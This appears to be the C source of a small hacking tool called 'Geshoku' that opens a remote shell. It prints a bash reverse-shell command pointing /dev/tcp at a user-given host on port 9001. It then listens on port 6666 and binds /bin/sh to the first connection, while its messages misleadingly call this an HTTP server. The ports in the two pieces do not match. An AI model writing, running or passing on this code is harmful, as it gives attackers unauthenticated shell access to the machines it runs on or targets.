#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <getopt.h>
#include <netinet/in.h>
#include <unistd.h>

void welcome_message() {
    printf("-----------Geshoku------------\n");
    printf("------------------------------\n");
    printf("------Version 0.001 Alpha-----\n");
    printf("------------------------------\n\n");
}

void spawn_shell(int client_socket) {
  char *argv[]={"/bin/sh",NULL};

  dup2(client_socket,0);
  dup2(client_socket,1);
  dup2(client_socket,2);

  execve("/bin/sh",argv,NULL);
  perror("[Err] Shell execution failed");
  exit(-1);
}

void start_server() {
  printf("[Info] Starting HTTP server...\n");
  int sockd=socket(AF_INET,SOCK_STREAM,0);
  if(sockd<0){
    perror("[Err] Failed socket creation");
    exit(-1);
  }
  struct sockaddr_in server_addr, client_addr;
  socklen_t client_len=sizeof(client_addr);
  server_addr.sin_family=AF_INET,
  server_addr.sin_addr.s_addr=INADDR_ANY,
  server_addr.sin_port=htons(6666);

  bind(sockd,(struct sockaddr *) &server_addr, sizeof(server_addr));
  
  if(listen(sockd,5)<0){
    perror("[Err] Listening failed");
    close(sockd);
    exit(-1);
  }

  printf("[Info] Geshoku listening on port 6666\n");

  int clientd=accept(sockd,(struct sockaddr *)&client_addr,&client_len);
  printf("[Info] Received callback\n");
  spawn_shell(clientd);
  close(clientd);
  close(sockd);

}



int main(int argc, char *argv[]) {
    if(argc<2){
        printf("invalid arguments\n");
        return 0;
    }

    int opt;
    while((opt=getopt(argc,argv,"s:h:"))!=-1) {
        switch(opt){
            case 's':
                welcome_message();
                printf("[Info] Reverse shell: sh -i >& /dev/tcp/%s/9001 0>&1\n",optarg);
                start_server();
                break;
            case 'h':
                welcome_message();
                printf("Help command: -h \n");
                break;
            default:
                printf("Invalid option\n");
                return 0;
        }
    }
    return 0;
}
